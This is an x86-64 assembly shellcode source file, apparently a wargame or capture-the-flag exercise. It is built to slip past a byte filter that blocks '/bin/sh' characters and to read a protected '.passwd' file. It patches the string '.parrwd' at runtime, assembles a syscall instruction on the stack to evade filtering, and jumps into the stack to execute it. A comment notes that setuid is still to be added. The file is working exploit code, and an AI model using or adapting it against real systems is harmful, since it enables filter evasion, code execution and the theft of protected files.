

; avoid '/', 'b', 'i', 'n', 's', 'h'
; avoid 2f,   62,  69,  6e,  73,  68, 20

; 1b 4e 55 5a 1b 5f 54 0c
; 14 14 14 14 14 14 14 14
section .text
global _start
;1162
;66 bf 8a 04
; .passwd
; 2e 70 61 73 73 77 64
; 2c 34 44 23 23 19 22
; 02 3c 1d 50 50 5e 42
_start:
    xor rdx, rdx
    jmp end
begin:
    pop rdi
    add byte [rdi + 3], 1
    add byte [rdi + 4], 1
    mov dx, 0x24a
    add dx, 0x2c5
; DX = SYSCALL NUMBER.
; PASSWD == 11
    sub rsp, 64
    mov word [rsp], dx
;  SYSCALL
; x/s $rsp  + 0x38

    mov dword [rsp + 2], 0x48c78948 ; mov rdi, rax
    mov rax, 0x90909090909089e6     ; mov rsi, rsp ; xor rax, rax
    mov qword [rsp + 6], rax
 ;  mov rdi, rax ; 48 89 c7
 ;  mov rsi, rsp ; 48 89 e6
 ;  xor rax, rax ; 48 31 c0
  ; mov dl, 30   ; b2 1e
;   SYSCALL
 ;  xor rdi, rdi ; 48 31 ff
 ;  inc rdi      ; 48 ff c7
 ;  mov rsi, rsp ; 48 89 e6
 ;  mov rdx, rax ; 48 89 c2
 ;  xor rax, rax ; 48 31 c0
 ;  mov rax, rdi ; 48 89 f8
;   SYSCALL
; Need to add SETUID(UID) 
    xor rax, rax
    xor rsi, rsi
    mov al, 2
 ;   mov dl, 3
 ;   mov dx, 0
    jmp rsp

end:
	call begin
	db ".parrwd"

